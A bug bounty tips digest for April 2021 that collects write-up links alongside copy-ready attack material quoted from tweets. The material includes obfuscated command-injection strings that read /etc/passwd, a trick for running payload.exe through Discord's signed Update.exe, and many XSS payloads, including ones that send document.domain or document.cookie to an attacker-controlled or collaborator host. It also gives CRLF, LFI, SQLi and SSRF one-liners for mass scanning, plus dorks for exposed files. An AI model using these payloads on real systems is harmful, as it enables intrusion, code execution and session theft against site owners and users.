# Bug Bounty Tips - April 2021

# 📅 01-Apr-2021
## Exploiting Account TakeOver => CSRF + CORS
- https://nirajmodi51.medium.com/missing-cors-leads-to-complete-account-takeover-1ed4b53bf9f2

## MindAPI 
Organize your API security assessment by using MindAPI. It's free and open for community collaboration.
- https://github.com/dsopas/MindAPI

## Bug Bytes 116
- https://blog.intigriti.com/2021/03/31/bug-bytes-116-new-oauth-attacks-hacking-shopify-with-a-single-dot-netmask-ssrf/

# 📅 02-Apr-2021
## Facebook Account Takeover writeups
- https://ysamm.com/?p=654
- https://ysamm.com/?p=646

## Dangerous Functions | Binary Exploitation 0x01
- https://youtu.be/EJtUW2AklVs

# 📅 05-Apr-2021
## Shodan Dorks
Everyone knows how to find Directory Listing Using Google Dorks Right?
Dork - intitle:"Index of /"

We can do the same with Shodan to find even more Directory Listings!

Dork- `http://ssl.cert.subject.CN:"*target.*" 200 http.title:"Index of /"`

## Obfuscation Random characters

### Payloads

```sh
$aaaaaaa/bin$bbbbbb/cat$ccccccc $dddddddd/etc$eeeeeee/passwd$ggggggg

$sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf
```
### Proof of Concept
![img](https://pbs.twimg.com/media/EyMKkZWVEAAInk9?format=png&name=small)
![img](https://pbs.twimg.com/media/EyMKkZXUYAIaclN?format=png&name=large)
***Source: https://twitter.com/sec715/status/1378957974790492160?s=20***

# 📅 07-Apr-2021
## RCE on Windows Application

Copy your payload into `%userprofile%\AppData\Local\Discord\Current\`

Then

```cmd
%userprofile%\AppData\Local\Discord\Update.exe --processStart payload.exe --process-start-args "whatever args"
```

Trusted signed binary will run the payload for you Smiling face with smiling eyes

***Source: https://twitter.com/smelly__vx/status/1379519938197655566?s=20***

# 📅 08-Apr-2021
## Facebook account takeover due to a wide platform bug in ajaxpipe responses
- https://ysamm.com/?p=654

## RCE WAF Bypass

```sh
;+$u+cat+/etc$u/passwd$u
;+$u+cat+/etc$u/passwd+\#
/???/??t+/???/??ss??
/?in/cat+/et?/passw?
```

# 📅 09-Apr-2021
## Writing Network Templates with Nuclei
- https://t.co/TiE9cg5p2K?amp=1

## Cloudflare bypass all browsers.
```js
<svg/onload=location/**/='https://your.server/'+document.domain>
```

# 📅 12-Apr-2021
## Bypassing root detection , certificate pinning using https://github.com/Ch0pin/medusa  anti_debug and unpinner modules 
@Einstais @mobilesecurity_
- https://twitter.com/Ch0pin/status/1381216805683924994?s=20

## XSS Bypass Tip
Hot XSS tip: did you know `window.alert?.()` and `(window?.alert)` will pop an alert? The ?. is a feature called optional chaining and as far as I can tell it's not in any popular XSS payload lists. Worth trying if you're looking for filter bypasses!
![img](https://pbs.twimg.com/media/EygnbstWUAAodo0?format=png&name=small)

## XSS Payload via email
`hello"><img/src="x"onerror=alert(document.domain)>@mail.com`
***source : https://hackerone.com/reports/1107726***

### XSS on glassdoor
```js
"&gt;&lt;img+src+onerror=confirm&amp;#x00028;1&amp;#x00029;&gt;
```
***Source : https://hackerone.com/reports/789689***

## CRLF Injection
- https://hackerone.com/reports/1038594
### Example
```text
https://www.abc.com/%0D%0ASet-Cookie:crlfinjection=crlfinjection
```

## Reflected XSS Successfull payloads
```js
<b onmouseover=alert('Wufff!')>click me!</b>
"><script>propmt("mamunwhh")</script>
"><script>alert(document.cookie)</script>
/><svg src=x onload=confirm("1337");>
"><div onmouseover="alert('XSS');">Hello :)
```
# 📅 15-Apr-2021
## Chrome Extension Pentesting
- https://twitter.com/harshbothra_/status/1382049428165390338?s=20

## Reflected XSS Payload

### Payload
```js
"><img src=x onerror=alert(1)> on every input field
'-alert(1)-' (WAF 405)
'-alert/**/(1)-' (WAF 405)
'-alert/*any*/(1)-' (Success)
```
![img](https://pbs.twimg.com/media/EyswkGtU4Ac3K3J?format=jpg&name=small)


# 📅 19-Apr-2021
## Stored XSS
```html
<iframe %00 src= javascript:fetch(\"//XXXXXXXXXXXXXXXXXXXXXXXXXXXXX.burpcollaborator.net/?param=\"+document.cookie)  %00>
```
***Source: https://infosecwriteups.com/pwning-your-assignments-stored-xss-via-graphql-endpoint-6dd36c8a19d5***

## Password change misconfiguration
- https://0x2m.medium.com/misconfiguration-in-change-password-functionality-leads-to-account-takeover-1314b5507abf

## Reflected XSS to RCE
```js
"><img src=x onerror=alert(whoami)>
```

## Google Dork to find Broken Link Hijacking:

`site:*.target.* link:twitter`

Then if you find a broken link, just create an account and claim it.

# 📅 23-Apr-2021
## Sometimes .DS_Store disclose some information
Dork used
```text
intext:.DS_Store & intitle:index -github
intitle:"index of" intext:".ds_store"
inurl:.DS_Store intitle:index of
inurl:.DS_Store intitle:index.of
```

### Dorks for help
```text
site:http://target.com -www
site:http://target.com intitle:”test” -support
site:http://target.com ext:php | ext:html
site:http://subdomain.target.com
site:http://target.com inurl:auth
site:http://target.com inurl:dev
```

# 📅 26-Apr-2021
## OWASP API Security Top 10
1. API1:2019 — Broken object level authorization
2. API2:2019 — Broken authentication
3. API3:2019 — Excessive data exposure
4. API4:2019 — Lack of resources and rate limiting
5. API5:2019 — Broken function level authorization
6. API6:2019 — Mass assignment
7. API7:2019 — Security misconfiguration
8. API8:2019 — Injection
9. API9:2019 — Improper assets management
10. API10:2019 — Insufficient logging and monitoring

## Hacking OAuth Apps part - I
- https://twitter.com/harshbothra_/status/1386528653136130048?s=20

## Find XSS using dalfox
cat subs.txt | waybackurl > wayback
cat subs.txt | gau > wayback2
cat subs.txt | hakrawler -depth 3 -plain > wayback3
cat wayback wayback2 wayback3 | sort -u > wayback_full
cat wayback_full | dalfox pipe -o result.txt

## Check Blind ssrf in Header,Path,Host & check xss via web cache poisning.

```sh
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
```
***Source : https://twitter.com/sratarun/status/1386628320406609921?s=20***

## Bash tip of the day
```sh
awk '{print substr($0,2,length()-2);}'
```
Deletes first and last character from the supplied input strings

## Reflected XSS Oneliner
```sh
waybackurls $target | grep '=' |qsreplace '"><svg/onload=alert(1337)>'| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<svg/onload=alert(1337)>" && echo "$host \033[0;31m" Vulnerable;done
```
***Source : https://twitter.com/reewardius/status/1386369207412170755?s=20***

## Oneliner to find SQLI in your target + subdomains
```sh 
python3 http://paramspider.py -d http://target.com -s TRUE -e woff,ttf,svg,eot | deduplicate --sort | sed '1,4d' | httpx -silent | sqlmap --level=5 --risk=3 
```
***source : https://twitter.com/LogicalHunter/status/1386622309344100358?s=20***

## LFI Oneliner
```sh
gau $target | gf lfi | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
***source : https://twitter.com/reewardius/status/1386347215849934848?s=20***
